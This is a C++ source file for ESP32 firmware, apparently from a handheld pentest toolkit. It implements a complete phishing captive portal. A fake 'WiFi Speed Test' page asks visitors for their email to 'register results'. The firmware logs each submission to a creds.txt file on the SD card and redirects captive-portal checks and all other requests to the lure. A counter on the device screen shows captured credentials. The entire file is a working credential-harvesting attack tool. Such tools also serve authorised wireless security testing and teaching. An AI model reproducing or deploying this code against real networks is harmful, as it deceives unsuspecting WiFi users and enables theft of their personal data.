#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>

static AsyncWebServer *phishServer = nullptr;
static int credsCaptured = 0;

static const char SPEED_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>WiFi Speed Test</title>
<style>body{font-family:sans-serif;background:#0a0a0f;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{text-align:center;max-width:400px;width:90%}
.bar{width:100%;height:24px;background:#1a1a2e;border-radius:12px;margin:16px 0;overflow:hidden}
.fill{height:100%;background:linear-gradient(90deg,#00ff88,#00aaff);border-radius:12px;animation:fill 3s ease-in-out infinite}
@keyframes fill{0%{width:0}50%{width:95%}100%{width:0}}
input{width:80%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:6px;background:#0a0a0f;color:#e0e0e0;box-sizing:border-box}
button{width:80%;padding:12px;margin-top:8px;border:none;border-radius:6px;background:#00ff88;color:#000;font-weight:bold;cursor:pointer}
h2{color:#00ff88}p{font-size:0.85rem;color:#888}</style></head>
<body><div class="c"><h2>WiFi Speed Test</h2>
<div class="bar"><div class="fill"></div></div>
<p>Running speed test...</p>
<input type="email" placeholder="Email to register results" name="email"><br>
<button onclick="fetch('/submit',{method:'POST',body:JSON.stringify({e:document.querySelector('[name=email]').value})}).then(()=>this.textContent='Done!')">Register</button>
<p>Sign in to view your results</p></div></body></html>
)rawliteral";

static void setupPhishRoutes() {
    phishServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", SPEED_HTML);
    });
    phishServer->on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {},
        NULL,
        [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
            credsCaptured++;
            if (setupSdCard()) {
                File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                if (f) { f.println("[wifispeed] " + String((char *)data).substring(0, len)); f.close(); }
            }
            request->send(200, "application/json", "{\"ok\":true}");
        });
    phishServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
    phishServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
}

void arsenal_phish_wifi_speed(void) {
    ARSENAL_HEAP_CHECK();
    credsCaptured = 0;
    phishServer = new AsyncWebServer(80);
    setupPhishRoutes();
    phishServer->begin();

    while (true) {
        drawMainBorderWithTitle("Phish WiFi Speed");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Clients: %d  Creds: %d", WiFi.softAPgetStationNum(), credsCaptured);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("IP: %s", WiFi.softAPIP().toString().c_str());
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
        if (check(EscPress)) break;
        delay(200);
    }

    phishServer->end();
    delete phishServer;
    phishServer = nullptr;
}
